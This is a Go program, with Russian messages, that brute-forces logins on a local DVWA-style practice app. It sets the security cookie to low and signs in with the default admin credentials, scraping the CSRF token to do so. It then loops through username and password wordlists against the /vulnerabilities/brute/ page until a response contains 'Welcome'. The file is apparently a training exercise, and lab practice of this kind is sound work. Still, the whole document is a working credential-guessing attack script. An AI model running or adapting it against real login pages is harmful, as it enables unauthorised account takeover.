package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
)

var (
	baseURL = &url.URL{
		Scheme: "http",
		Host:   "127.0.0.1:4280",
	}
	bruteforceURL      = "http://127.0.0.1:4280/vulnerabilities/brute/"
	loginURL           = "http://127.0.0.1:4280/login.php"
	userTokenRegexpStr = `<input\s+type=['"]hidden['"]\s+name=['"]user_token['"]\s+value=['"]([^'"]+)['"]\s*/?>`
)

func openFile(name string) *bufio.Scanner {
	file, err := os.Open(name)
	if err != nil {
		panic(fmt.Sprintf("Ошибка открытия файла: %v", err))
	}

	return bufio.NewScanner(file)
}

func setup(client *http.Client) {
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	securityCookie := &http.Cookie{Name: "security", Value: "low"}
	client.Jar.SetCookies(baseURL, []*http.Cookie{securityCookie})

	loginPageRequest, err := http.NewRequest("GET", loginURL, nil)
	if err != nil {
		panic(err)
	}

	loginPageRequest.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")

	loginPageResponse, err := client.Do(loginPageRequest)
	if err != nil {
		panic(err)
	}

	defer loginPageResponse.Body.Close()

	loginPageHTML, err := io.ReadAll(loginPageResponse.Body)
	if err != nil {
		panic(err)
	}

	userTokenRegexp := regexp.MustCompile(userTokenRegexpStr)
	match := userTokenRegexp.FindStringSubmatch(string(loginPageHTML))

	if len(match) < 1 {
		panic("UserToken не найден")
	}

	userToken := match[1]

	data := url.Values{}
	data.Set("username", "admin")
	data.Set("password", "password")
	data.Set("Login", "Login")
	data.Set("user_token", userToken)

	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	if err != nil {
		panic(err)
	}

	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")

	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
}

func main() {
	jar, err := cookiejar.New(nil)

	if err != nil {
		fmt.Println("Ошибка инициализации cookiejar: ", err)
		return
	}

	client := &http.Client{
		Jar: jar,
	}
	setup(client)
	usernamesScanner := openFile("usernames.txt")

	for usernamesScanner.Scan() {
		username := usernamesScanner.Text()
		passwordsScanner := openFile("passwords.txt")

		for passwordsScanner.Scan() {
			password := passwordsScanner.Text()
			success, err := tryLogin(client, username, password)

			if err != nil {
				fmt.Println("Ошибка при попытке авторизации для пользователя", username, ":", err)
				continue
			}

			if success {
				fmt.Printf("Пароль для пользователя %s найден: %s\n", username, password)
				return
			}
		}

		if err := passwordsScanner.Err(); err != nil {
			panic(err)
		}
	}

	if err := usernamesScanner.Err(); err != nil {
		panic(err)
	}
}

func tryLogin(client *http.Client, username, password string) (bool, error) {
	params := url.Values{}
	params.Set("username", username)
	params.Set("password", password)
	params.Set("Login", "Login")

	fullURL := fmt.Sprintf("%s?%s#", bruteforceURL, params.Encode())
	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		return false, err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}

	if strings.Contains(string(body), "Welcome") {
		return true, nil
	}

	return false, nil
}
